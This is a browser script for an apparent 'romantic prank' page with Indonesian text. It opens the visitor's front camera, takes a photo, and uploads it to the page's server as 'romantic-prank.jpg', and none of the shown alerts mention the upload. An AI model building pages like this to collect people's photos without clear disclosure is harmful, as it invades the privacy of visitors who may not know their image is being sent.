let stream = null;
let capturedImage = null;

const intro = document.getElementById('intro');
const cameraSection = document.getElementById('camera-section');
const result = document.getElementById('result');

const startBtn = document.getElementById('start-btn');
const captureBtn = document.getElementById('capture-btn');

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const capturedPhoto = document.getElementById('captured-photo');

startBtn.addEventListener('click', requestCameraAccess);

async function requestCameraAccess() {
    try {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            alert('Browser ini tidak mendukung akses kamera.');
            return;
        }

        stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            },
            audio: false
        });

        video.srcObject = stream;

        intro.classList.add('hidden');
        cameraSection.classList.remove('hidden');

        await video.play();

    } catch (error) {
        console.error('Camera error:', error);

        alert(
            'Akses kamera diperlukan untuk melanjutkan. ' +
            'Silakan izinkan kamera di browser.'
        );
    }
}

captureBtn.addEventListener('click', capturePhoto);

async function capturePhoto() {
    if (!stream || !video.videoWidth) {
        alert('Kamera belum siap.');
        return;
    }

    captureBtn.disabled = true;
    captureBtn.textContent = 'Sebentar ya ❤️';

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext('2d');

    ctx.drawImage(
        video,
        0,
        0,
        canvas.width,
        canvas.height
    );

    capturedImage = canvas.toDataURL(
        'image/jpeg',
        0.92
    );

    stopCamera();

    try {
        await sendPhotoToServer();

        cameraSection.classList.add('hidden');
        result.classList.remove('hidden');

        capturedPhoto.src = capturedImage;

    } catch (error) {
        console.error('Upload error:', error);

        captureBtn.disabled = false;
        captureBtn.textContent = 'Coba Lagi ❤️';

        alert(
            'Foto berhasil diambil, tetapi gagal mengirimnya. ' +
            'Coba lagi.'
        );
    }
}

function stopCamera() {
    if (!stream) return;

    stream.getTracks().forEach(track => {
        track.stop();
    });

    stream = null;
    video.srcObject = null;
}

async function sendPhotoToServer() {
    const response = await fetch(capturedImage);
    const blob = await response.blob();

    const formData = new FormData();

    formData.append(
        'photo',
        blob,
        'romantic-prank.jpg'
    );

    const result = await fetch('/send-photo', {
        method: 'POST',
        body: formData
    });

    const data = await result.json();

    if (!result.ok || !data.ok) {
        throw new Error(
            data.error || 'Server gagal menerima foto.'
        );
    }

    console.log('❤️ Foto berhasil dikirim ke server.');
}
